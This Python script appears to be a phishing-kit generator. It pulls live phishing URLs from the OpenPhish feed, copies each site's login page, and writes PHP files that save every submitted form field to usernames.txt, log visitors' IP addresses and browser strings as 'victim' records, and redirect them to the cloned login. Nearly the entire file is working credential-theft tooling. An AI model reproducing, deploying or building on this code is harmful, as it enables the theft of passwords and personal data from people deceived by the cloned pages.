import requests
import bs4
import re
import os

def open_url(url):
    return requests.get(url, 
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
             '(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'},
    timeout=10)

def parse(html):
    return bs4.BeautifulSoup(html.text, 'lxml')

def check_arr(arr) -> bool:
    return len(arr) != 0 and all(x == arr[0] for x in arr)


class PhishSite:

    def __init__(self, url: str) -> None:
        self.is_alive = True
        self.url = url

        self.html = open_url(url)
        self.parsed_html = parse(self.html)

        self.login_options = ['login', 'username', 'email']
        self.password_options = ['pd', 'password', 'pwd']

    def find_php(self) -> str:
        php = re.findall(r'\w+.php', self.html.text)
        if check_arr(php):
            return php[0]
        else:
            self.is_alive = False

    def find_elements(self) -> list:
        result = []

        for elem in re.findall(r'<input.+name="\w+".+>', self.html.text.replace('\n', ' ')):
            elem1 = re.search(r'name="\w+"', elem)[0]
            elem2 = re.search(r'"\w+"', elem1)[0]
            if elem2 == '""':
                continue
            elem2 = elem2[1:-1]
            if elem2 not in result:
                result.append(elem2)
        if len(result) == 0:
            self.is_alive = False
        return result


class Folder:
    def __init__(self, path, html, php, attrs) -> None:
        self.path = path
        self.html = html
        self.php_login_file = php
        self.attrs = attrs
    
    def create_login_file(self) -> None:
        with open(os.path.join(self.path, self.php_login_file), 'w+') as file:
            # file.writelines([
            #     '<?php\n',
            #     f"""file_put_contents("usernames.txt", "Account: " . $_POST['{self.login}'] . " Pass: " . $_POST['{self.password}'] . "\\n", FILE_APPEND);\n""",
            #     'exit();\n'
            # ])
            file.writelines([
                '<?php\n',
                'file_put_contents("usernames.txt", ',
            ] + [f""""{attr}" . $_POST['{attr}'] . """ for attr in attrs] + [
            '"\\n", FILE_APPEND);\n',
            'exit();\n']
            )

    def create_ip_file(self) -> None:
        with open(os.path.join(self.path, 'ip.php'), 'w+') as file:
            file.writelines([
                '<?php\n',
                "if (!empty($_SERVER['HTTP_CLIENT_IP'])){\n",
                """$ipaddress = $_SERVER['HTTP_CLIENT_IP']."\\r\\n";}\n""",
                "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){\n",
                """$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\\r\\n";}\n""",
                'else{\n',
                """$ipaddress = $_SERVER['REMOTE_ADDR']."\\r\\n";}\n""",
                '$useragent = " User-Agent: ";\n',
                "$browser = $_SERVER['HTTP_USER_AGENT'];\n",

                "$file = 'ip.txt';\n",
                '$victim = "IP: ";\n',
                "$fp = fopen($file, 'a');\n",
                'fwrite($fp, $victim);\n',
                'fwrite($fp, $ipaddress);\n',
                'fwrite($fp, $useragent);\n',
                'fwrite($fp, $browser);\n'
            ])

    def create_index_file(self) -> None:
        with open(os.path.join(self.path, 'index.php'), 'w+') as file:
            file.writelines([
                '<?php\n',
                "include 'ip.php';\n",
                "header('Location: login.html');\n",
                'exit?>\n'
            ])

    def create_html_file(self) -> None:
        with open(os.path.join(self.path, 'login.html'), 'w+') as file:
            file.write(self.html.text)

    def create_folder(self) -> None:
        if not os.path.exists(self.path):
            os.makedirs(self.path)


if __name__ == '__main__':

    for url in bs4.BeautifulSoup(requests.get('https://openphish.com/').text, 'lxml').find_all('td', class_="url_entry"):
        print('\nURL: ' + url.text.split('/')[2])
        try:
            phishsite_obj = PhishSite(url.text)
            if phishsite_obj.html.status_code != 200:
                print('[-] Smth went wrong... Cant connect')
                print('[-]', phishsite_obj.html)
                del phishsite_obj
                continue

            php_file = phishsite_obj.find_php()
            if not phishsite_obj.is_alive:
                print('[-] Smth went wrong... Cant find php file')
                del phishsite_obj
                continue
            
            attrs = phishsite_obj.find_elements()
            if not phishsite_obj.is_alive:
                print('[-] Smth went wrong... Cant find place to enter attrs')
                del phishsite_obj
                continue

            folder = Folder(phishsite_obj.url.split('/')[2], phishsite_obj.html, php_file, attrs)
            folder.create_folder()
            folder.create_html_file()
            folder.create_login_file()
            folder.create_index_file()
            folder.create_ip_file()
            del folder
            print('[+] Done!')
        except:
            print('[-] Smth went wrong... Cant connect')
